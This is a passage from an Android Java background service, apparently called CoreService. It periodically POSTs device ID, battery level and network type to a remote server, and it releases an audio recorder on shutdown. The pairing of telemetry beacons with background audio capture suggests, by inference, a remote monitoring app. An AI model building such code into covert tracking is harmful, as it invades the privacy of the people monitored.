                JSONObject obj = new JSONObject();
                obj.put("device_id", deviceId);
                obj.put("online", true);
                obj.put("time", System.currentTimeMillis());
                obj.put("battery", getBatteryLevel());
                obj.put("network", getNetworkType());
                
                URL url = new URL(serverUrl + "/api/data");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.getOutputStream().write(obj.toString().getBytes());
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Heartbeat error", e);
            }
        });
    }

    private int getBatteryLevel() {
        try {
            Intent battery = registerReceiver(null, new IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED));
            if (battery != null) {
                int level = battery.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, 0);
                int scale = battery.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, 100);
                return (level * 100) / scale;
            }
        } catch (Exception ignored) {}
        return -1;
    }

    private String getNetworkType() {
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm != null) {
                NetworkInfo info = cm.getActiveNetworkInfo();
                if (info != null && info.isConnected()) {
                    return info.getTypeName();
                }
            }
        } catch (Exception ignored) {}
        return "none";
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        running = false;
        if (handler != null) handler.removeCallbacksAndMessages(null);
        if (executor != null) executor.shutdownNow();
        if (audioRecord != null) {
            try {
                if (recording) audioRecord.stop();
                audioRecord.release();
            } catch (Exception ignored) {}
        }
        Log.d(TAG, "CoreService destroyed");
    }
}
